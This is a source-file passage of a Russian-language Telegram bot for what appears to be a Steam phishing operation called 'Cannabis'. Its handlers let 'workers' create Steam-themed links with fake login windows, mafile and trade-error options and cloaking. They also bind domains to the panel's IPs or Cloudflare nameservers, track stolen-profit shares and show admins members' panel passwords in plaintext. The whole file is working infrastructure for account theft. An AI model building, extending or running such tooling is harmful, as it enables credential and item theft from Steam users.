      const linkId = await resolveReferralPanelLinkId(auth, user, domainId, existing);
      if (!linkId) {
        await ctx.answerCbQuery("Не найден ID ссылки", { show_alert: true });
        return;
      }
      await updateSteamLink(auth.token, domainId, linkId, { windowType });
      await ctx.answerCbQuery("Окно обновлено");
      await renderReferralScreen(ctx, user, domainId, auth);
    } catch (e) {
      const message =
        e?.response?.data?.message || e?.response?.data?.code || e.message;
      await ctx.answerCbQuery();
      await upsertBotMessage(ctx, `❌ Не удалось сменить окно: ${message}`, {
        reply_markup: referralLinkKeyboard(domainId).reply_markup,
      });
    }
  });

  bot.action("sites:links:noop", async (ctx) => {
    await ctx.answerCbQuery("Это существующая ссылка");
  });

  bot.action(/^sites:link_create:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const domainName = ctx.session?.sites?.activeDomainName || "";
    const user = await ensureUser(ctx.from);
    try {
      const auth = await getPanelToken(user);
      const domainsResponse = await getDomains(auth.token, 0, 50);
      const ownDomains = filterOwnDomainsOnly(domainsResponse?.rows || [], auth.ownerId);
      const ownDomain = ownDomains.find((d) => Number(d.id) === Number(domainId));
      if (!ownDomain) {
        await ctx.answerCbQuery(
          "Создание ссылки доступно только на вашем личном домене",
          { show_alert: true }
        );
        return;
      }
    } catch (error) {
      await ctx.answerCbQuery();
      await upsertBotMessage(ctx, `❌ Ошибка проверки домена: ${error.message}`);
      return;
    }

    ctx.session.linkCreate = {
      domainId,
      domainName,
      path: "",
      windowType: "FakeWindow",
      templateId: null,
      templateName: "",
    };
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      [
        "⚙️ <b>Основные настройки</b>",
        "",
        `<b>Домен:</b> <code>${domainName || domainId}</code>`,
        "<b>Адрес страницы:</b> необязательно",
        "<b>Шаблон:</b> не выбран",
        "<b>Окно авторизации:</b> Фейк окно",
      ].join("\n"),
      { reply_markup: linkCreatorKeyboard(domainId, ctx.session.linkCreate).reply_markup }
    );
  });

  bot.action("sites:link:path", async (ctx) => {
    if (!ctx.session?.linkCreate) {
      await ctx.answerCbQuery("Сначала начните создание ссылки", { show_alert: true });
      return;
    }
    ctx.session.linkCreateStep = "path_input";
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, "✍️ Введите адрес страницы (path), например: <code>2</code>.\nИли отправьте <code>-</code>, чтобы оставить пустым.");
  });

  bot.action("sites:link:template", async (ctx) => {
    if (!ctx.session?.linkCreate) {
      await ctx.answerCbQuery("Сначала начните создание ссылки", { show_alert: true });
      return;
    }
    const user = await ensureUser(ctx.from);
    try {
      const auth = await getPanelToken(user);
      const templatesResponse = await getTemplates(auth.token, 0, 15);
      const templates = templatesResponse?.rows || [];
      ctx.session.linkTemplates = templates;
      await ctx.answerCbQuery();
      await upsertBotMessage(
        ctx,
        "📄 Выберите шаблон:",
        { reply_markup: templatesKeyboard(templates).reply_markup }
      );
    } catch (error) {
      await ctx.answerCbQuery();
      await upsertBotMessage(ctx, `❌ Ошибка получения шаблонов: ${error.message}`);
    }
  });

  bot.action(/^sites:template:(\d+)$/, async (ctx) => {
    const templateId = Number(ctx.match[1]);
    const templates = ctx.session?.linkTemplates || [];
    const found = templates.find((t) => Number(t.id) === templateId);
    if (!ctx.session?.linkCreate || !found) {
      await ctx.answerCbQuery("Шаблон не найден", { show_alert: true });
      return;
    }
    ctx.session.linkCreate.templateId = found.id;
    ctx.session.linkCreate.templateName = found.name;
    await ctx.answerCbQuery("Шаблон выбран");
    await upsertBotMessage(
      ctx,
      [
        "⚙️ <b>Основные настройки</b>",
        "",
        `<b>Домен:</b> <code>${ctx.session.linkCreate.domainName || ctx.session.linkCreate.domainId}</code>`,
        `<b>Адрес страницы:</b> ${ctx.session.linkCreate.path ? `/${ctx.session.linkCreate.path}` : "необязательно"}`,
        `<b>Шаблон:</b> ${ctx.session.linkCreate.templateName}`,
        `<b>Окно авторизации:</b> ${ctx.session.linkCreate.windowType}`,
      ].join("\n"),
      {
        reply_markup: linkCreatorKeyboard(
          ctx.session.linkCreate.domainId,
          ctx.session.linkCreate
        ).reply_markup,
      }
    );
  });

  bot.action("sites:link:window", async (ctx) => {
    if (!ctx.session?.linkCreate) {
      await ctx.answerCbQuery("Сначала начните создание ссылки", { show_alert: true });
      return;
    }
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      "Выберите окно авторизации:",
      { reply_markup: linkWindowTypeKeyboard().reply_markup }
    );
  });

  bot.action(/^sites:window:(FakeWindow|CurrentWindow|NewWindow|AboutBlank)$/, async (ctx) => {
    if (!ctx.session?.linkCreate) {
      await ctx.answerCbQuery("Сначала начните создание ссылки", { show_alert: true });
      return;
    }
    const windowType = ctx.match[1];
    ctx.session.linkCreate.windowType = windowType;
    await ctx.answerCbQuery("Окно обновлено");
    await upsertBotMessage(
      ctx,
      [
        "⚙️ <b>Основные настройки</b>",
        "",
        `<b>Домен:</b> <code>${ctx.session.linkCreate.domainName || ctx.session.linkCreate.domainId}</code>`,
        `<b>Адрес страницы:</b> ${ctx.session.linkCreate.path ? `/${ctx.session.linkCreate.path}` : "необязательно"}`,
        `<b>Шаблон:</b> ${ctx.session.linkCreate.templateName || "не выбран"}`,
        `<b>Окно авторизации:</b> ${ctx.session.linkCreate.windowType}`,
      ].join("\n"),
      {
        reply_markup: linkCreatorKeyboard(
          ctx.session.linkCreate.domainId,
          ctx.session.linkCreate
        ).reply_markup,
      }
    );
  });

  bot.action("sites:link:editor", async (ctx) => {
    if (!ctx.session?.linkCreate) {
      await ctx.answerCbQuery("Сначала начните создание ссылки", { show_alert: true });
      return;
    }
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      [
        "⚙️ <b>Основные настройки</b>",
        "",
        `<b>Домен:</b> <code>${ctx.session.linkCreate.domainName || ctx.session.linkCreate.domainId}</code>`,
        `<b>Адрес страницы:</b> ${ctx.session.linkCreate.path ? `/${ctx.session.linkCreate.path}` : "необязательно"}`,
        `<b>Шаблон:</b> ${ctx.session.linkCreate.templateName || "не выбран"}`,
        `<b>Окно авторизации:</b> ${ctx.session.linkCreate.windowType}`,
      ].join("\n"),
      {
        reply_markup: linkCreatorKeyboard(
          ctx.session.linkCreate.domainId,
          ctx.session.linkCreate
        ).reply_markup,
      }
    );
  });

  bot.action(/^sites:link:create:(\d+)$/, async (ctx) => {
    const domainId = Number(ctx.match[1]);
    const state = ctx.session?.linkCreate;
    if (!state || state.domainId !== domainId) {
      await ctx.answerCbQuery("Сессия создания ссылки потеряна", { show_alert: true });
      return;
    }
    if (!state.templateId) {
      await ctx.answerCbQuery("Выберите шаблон", { show_alert: true });
      return;
    }

    const user = await ensureUser(ctx.from);
    try {
      const auth = await getPanelToken(user);
      const domainsResponse = await getDomains(auth.token, 0, 50);
      const ownDomains = filterOwnDomainsOnly(domainsResponse?.rows || [], auth.ownerId);
      const ownDomain = ownDomains.find((d) => Number(d.id) === Number(domainId));
      if (!ownDomain) {
        await ctx.answerCbQuery();
        await upsertBotMessage(
          ctx,
          "❌ Нельзя создать ссылку: выбранный домен не принадлежит вашему аккаунту панели."
        );
        return;
      }

      const payload = {
        path: state.path || "",
        windowType: state.windowType || "FakeWindow",
        domain: domainId,
        template: state.templateId,
        cloaking: false,
        ban_vpn: false,
        iframe: true,
        logError: true,
        mafileError: false,
        mafileSteamRedirect: true,
        tradeError: true,
        randPath: !state.path,
      };
      const created = await createSteamLink(auth.token, payload);
      ctx.session.linkCreate = null;
      ctx.session.linkTemplates = null;
      await ctx.answerCbQuery("Ссылка создана");
      await upsertBotMessage(
        ctx,
        [
          "✅ <b>Ссылка успешно создана</b>",
          `<b>ID:</b> <code>${created?.id || "-"}</code>`,
          `<b>Path:</b> <code>/${created?.path || state.path || "random"}</code>`,
          `<b>Шаблон:</b> ${created?.template?.name || state.templateName}`,
          `<b>Owner:</b> <code>${created?.owner ?? "-"}</code>`,
        ].join("\n")
      );
    } catch (error) {
      const message =
        error?.response?.data?.message ||
        error?.response?.data?.code ||
        error.message;
      await ctx.answerCbQuery();
      await upsertBotMessage(ctx, `❌ Ошибка создания ссылки: ${message}`);
    }
  });

  bot.action("sites:add", async (ctx) => {
    ctx.session.sitesFlow = { step: "domain_input" };
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      "✍️ Введите домен для добавления (например: example.com)"
    );
  });

  bot.action("sites:bind:ip", async (ctx) => {
    const pendingDomain = ctx.session?.sitesFlow?.domain;
    if (!pendingDomain) {
      await ctx.answerCbQuery("Сначала введите домен", { show_alert: true });
      return;
    }
    const user = await ensureUser(ctx.from);
    try {
      const auth = await getPanelToken(user);
      const ips = await getActualIPs(auth.token);
      const ip = Array.isArray(ips) && ips.length > 0 ? ips[0] : "-";
      await ctx.answerCbQuery();
      await upsertBotMessage(
        ctx,
        [
          "✅ <b>Привяжи домен</b>",
          "Установи указанный ниже IP-адрес в “A” запись домена:",
          "",
          `<b>Домен:</b> <code>${pendingDomain}</code>`,
          `<b>IP-адрес:</b> <code>${ip}</code>`,
        ].join("\n")
      );
    } catch (error) {
      await ctx.answerCbQuery();
      await upsertBotMessage(ctx, `❌ Ошибка: ${error.message}`);
    } finally {
      ctx.session.sitesFlow = null;
    }
  });

  bot.action("sites:bind:cf", async (ctx) => {
    const pendingDomain = ctx.session?.sitesFlow?.domain;
    if (!pendingDomain) {
      await ctx.answerCbQuery("Сначала введите домен", { show_alert: true });
      return;
    }
    const user = await ensureUser(ctx.from);
    try {
      const auth = await getPanelToken(user);
      const ns = await getCloudflareNameservers(auth.token);
      await ctx.answerCbQuery();
      await upsertBotMessage(
        ctx,
        [
          "✅ <b>Привяжи домен</b>",
          "В записях домена должны быть только эти NS-сервера:",
          "",
          `<b>Домен:</b> <code>${pendingDomain}</code>`,
          `<b>NS1:</b> <code>${ns?.ns1 || "-"}</code>`,
          `<b>NS2:</b> <code>${ns?.ns2 || "-"}</code>`,
        ].join("\n")
      );
    } catch (error) {
      await ctx.answerCbQuery();
      await upsertBotMessage(ctx, `❌ Ошибка: ${error.message}`);
    } finally {
      ctx.session.sitesFlow = null;
    }
  });

  bot.action("menu:about", async (ctx) => {
    const projectStats = await getProjectProfitStats();
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      [
        "<b>Информация о проекте Cannabis</b>",
        "└ Дата открытия: 08.04.2026",
        "",
        `Сумма профитов: <b>${Math.round(projectStats.totalProfit)}$</b>`,
        `Количество профитов: <b>${projectStats.count}</b>`,
        "",
        "<b>Процент выплат:</b>",
        "└ Воркеру: 80%",
      ].join("\n"),
      {
        reply_markup: aboutProjectKeyboard(
          env.aboutInfoChannelUrl,
          ctx.session?.aboutInviteLinks || {}
        ).reply_markup,
      }
    );
  });

  bot.action("about:workers_chat", async (ctx) => {
    await handleAboutProtectedChannelClick(ctx, "workers_chat");
  });

  bot.action("about:payouts", async (ctx) => {
    await handleAboutProtectedChannelClick(ctx, "payouts");
  });

  bot.action("about:manuals", async (ctx) => {
    await handleAboutProtectedChannelClick(ctx, "manuals");
  });

  bot.action("about:rules", async (ctx) => {
    await ctx.answerCbQuery();
    await upsertBotMessage(ctx, getProjectRulesLines().join("\n"), {
      reply_markup: aboutRulesBackKeyboard().reply_markup,
    });
  });

  bot.action("menu:settings", async (ctx) => {
    await ctx.answerCbQuery();
    await renderSettings(ctx);
  });

  bot.action("settings:toggle_nick", async (ctx) => {
    await toggleAnonymous(ctx.from.id);
    await ctx.answerCbQuery("Настройка обновлена");
    await renderSettings(ctx);
  });

  bot.action("settings:add_description", async (ctx) => {
    ctx.session.profileEditBio = true;
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      "✍️ Отправь текст для поля «О себе» (до 250 символов)."
    );
  });

  bot.action("menu:top_workers", async (ctx) => {
    await ctx.answerCbQuery();
    await renderTopWorkers(ctx, "all");
  });

  bot.action(/^top:period:(all|24h|7d|30d)$/, async (ctx) => {
    const period = ctx.match[1];
    await ctx.answerCbQuery(`Период: ${periodLabel(period)}`);
    await renderTopWorkers(ctx, period);
  });

  bot.action("profile:edit_bio", async (ctx) => {
    await ctx.answerCbQuery();
    ctx.session.profileEditBio = true;
    await upsertBotMessage(
      ctx,
      "✍️ Отправь текст для поля «О себе» (до 250 символов)."
    );
  });

  bot.action("profile:toggle_anonymous", async (ctx) => {
    const user = await toggleAnonymous(ctx.from.id);
    await ctx.answerCbQuery(
      user?.isAnonymous ? "Анонимность включена" : "Анонимность выключена"
    );
    await renderProfile(ctx, "all");
  });

  bot.action("admin:panel", async (ctx) => {
    if (!requireAdmin(ctx)) return;
    await ctx.answerCbQuery();
    const globalPercent = await getGlobalWorkerPercent(80);
    await upsertBotMessage(ctx, "🛠 Админ-панель", {
      reply_markup: adminPanelKeyboard(globalPercent).reply_markup,
    });
  });

  bot.action("admin:search", async (ctx) => {
    if (!requireAdmin(ctx)) return;
    await ctx.answerCbQuery();
    ctx.session.adminInput = { type: "search_user" };
    await upsertBotMessage(
      ctx,
      "🔎 Введите Telegram ID или username пользователя для поиска."
    );
  });

  bot.action("admin:global_percent", async (ctx) => {
    if (!requireAdmin(ctx)) return;
    const current = await getGlobalWorkerPercent(80);
    ctx.session.adminInput = { type: "global_percent" };
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      `🌍 Текущий глобальный процент: <b>${current}%</b>\nВведите новое значение от 1 до 100.`
    );
  });

  bot.action(/^admin:member:(.+)$/, async (ctx) => {
    if (!requireAdmin(ctx)) return;
    const telegramId = ctx.match[1];
    const member = await getUserByTelegramId(telegramId);
    if (!member) {
      await ctx.answerCbQuery("Пользователь не найден", { show_alert: true });
      return;
    }

    let domainsCount = 0;
    let domainsPreview = "-";
    if (member.panelUsername && member.panelPassword) {
      try {
        const auth = await getPanelToken(member);
        const domainsResponse = await getDomains(auth.token, 0, 15);
        const ownedDomains = filterAvailableDomains(domainsResponse?.rows || [], auth.ownerId);
        domainsCount = ownedDomains.length;
        domainsPreview =
          ownedDomains
            .slice(0, 3)
            .map((d) => d.domain)
            .join(", ") || "-";
      } catch (_) {
        domainsPreview = "Ошибка доступа к панели";
      }
    }

    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      [
        "👤 <b>Управление пользователем</b>",
        `<b>ID:</b> <code>${member.telegramId}</code>`,
        `<b>Username:</b> @${member.username || "unknown"}`,
        `<b>Роль:</b> ${member.role}`,
        `<b>В команде:</b> ${member.isTeamMember ? "Да" : "Нет"}`,
        `<b>Заблокирован:</b> ${member.isBanned ? "Да" : "Нет"}`,
        `<b>Профиты:</b> ${formatMoney(member.totalProfit || 0)}`,
        `<b>Процент:</b> ${member.profitPercent}%`,
        `<b>Login:</b> <code>${member.panelUsername || "-"}</code>`,
        `<b>Password:</b> <code>${member.panelPassword || "-"}</code>`,
        `<b>Сайтов:</b> ${domainsCount}`,
        `<b>Домены:</b> ${domainsPreview}`,
      ].join("\n"),
      {
      reply_markup: memberActionKeyboard(telegramId, member.isBanned).reply_markup,
      }
    );
  });

  bot.action(/^admin:kick:(.+)$/, async (ctx) => {
    if (!requireAdmin(ctx)) return;
    const telegramId = ctx.match[1];
    await setTeamMember(telegramId, false);
    await ctx.answerCbQuery("Участник удален из команды");
    await upsertBotMessage(ctx, `❌ Участник <code>${telegramId}</code> кикнут.`);
  });

  bot.action(/^admin:ban:(.+)$/, async (ctx) => {
    if (!requireAdmin(ctx)) return;
    const telegramId = ctx.match[1];
    await setBan(telegramId, true);
    await ctx.answerCbQuery("Пользователь забанен");
    await upsertBotMessage(ctx, `🚫 Пользователь <code>${telegramId}</code> забанен.`);
  });

  bot.action(/^admin:unban:(.+)$/, async (ctx) => {
    if (!requireAdmin(ctx)) return;
    const telegramId = ctx.match[1];
    await setBan(telegramId, false);
    await ctx.answerCbQuery("Пользователь разблокирован");
    await upsertBotMessage(ctx, `✅ Пользователь <code>${telegramId}</code> разблокирован.`);
  });

  bot.action(/^admin:msg:(.+)$/, async (ctx) => {
    if (!requireAdmin(ctx)) return;
    const telegramId = ctx.match[1];
    ctx.session.adminCompose = { telegramId };
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      `✉️ Введи текст сообщения для пользователя <code>${telegramId}</code>.`
    );
  });

  bot.action(/^admin:profit:(.+)$/, async (ctx) => {
    if (!requireAdmin(ctx)) return;
    const telegramId = ctx.match[1];
    const member = await getUserByTelegramId(telegramId);
    if (!member) {
      await ctx.answerCbQuery("Пользователь не найден", { show_alert: true });
      return;
    }
    ctx.session.adminInput = { type: "profit", telegramId };
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      `💸 Введите сумму общего профита для <code>${telegramId}</code>.\nПроцент воркера: ${member.profitPercent}%`
    );
  });

  bot.action(/^admin:percent:(.+)$/, async (ctx) => {
    if (!requireAdmin(ctx)) return;
    const telegramId = ctx.match[1];
    const member = await getUserByTelegramId(telegramId);
    if (!member) {
      await ctx.answerCbQuery("Пользователь не найден", { show_alert: true });
      return;
    }
    ctx.session.adminInput = { type: "percent", telegramId };
    await ctx.answerCbQuery();
    await upsertBotMessage(
      ctx,
      `⚙️ Введите новый процент воркера для <code>${telegramId}</code>.\nТекущее значение: ${member.profitPercent}%`
    );
  });

  bot.action("onboarding:start", async (ctx) => {
    await ctx.answerCbQuery();
    await ctx.scene.enter("onboardingScene");
  });

  bot.action(/^moderate:(accept|reject):(.+)$/, async (ctx) => {
    if (!requireAdmin(ctx)) return;
    const action = ctx.match[1];
    const applicationId = ctx.match[2];
    const application = await getPendingApplicationById(applicationId);
    if (!application || application.status !== "pending") {
      await ctx.answerCbQuery("Заявка уже обработана", { show_alert: true });
      return;
    }

    const newStatus = action === "accept" ? "accepted" : "rejected";
    const updated = await updateApplicationStatus(applicationId, newStatus, ctx.from.id);

    if (action === "accept") {
      await setTeamMember(updated.userId.telegramId, true);
      try {
        const panelUsername = buildAutoPanelUsername(updated.userId);
        const panelPassword = generatePassword(10);
        await createWorkerAccount(panelUsername, panelPassword);
        updated.userId.panelUsername = panelUsername;
        updated.userId.panelPassword = panelPassword;
        updated.userId.panelCreatedAt = new Date();
        await updated.userId.save();
      } catch (error) {
        logger.error(
          "Auto panel creation failed",
          updated.userId.telegramId,
          error?.response?.data || error.message
        );
      }
      await ctx.telegram.sendMessage(
        updated.userId.telegramId,
        "✅ Ваша заявка принята.\nПанель уже привязана к вашему Telegram.\nНажмите кнопку ниже, чтобы продолжить.",
        { reply_markup: acceptedStartKeyboard().reply_markup }
      );
    } else {
      await ctx.telegram.sendMessage(
        updated.userId.telegramId,
        "❌ К сожалению, твоя заявка была отклонена."
      );
    }

    const moderatorName = ctx.from.first_name || ctx.from.username || "Admin";
    const resultLabel =
      action === "accept"
        ? `✅ Принял: ${moderatorName}`
        : `❌ Отклонил: ${moderatorName}`;

    await ctx.editMessageReplyMarkup({
      inline_keyboard: [[{ text: resultLabel, callback_data: "moderate:done" }]],
    });
    await ctx.answerCbQuery(
      action === "accept" ? "Заявка принята" : "Заявка отклонена"
    );
  });

  bot.action("moderate:done", async (ctx) => {
    await ctx.answerCbQuery("Заявка уже обработана");
  });
}

module.exports = { registerCallbackHandlers };
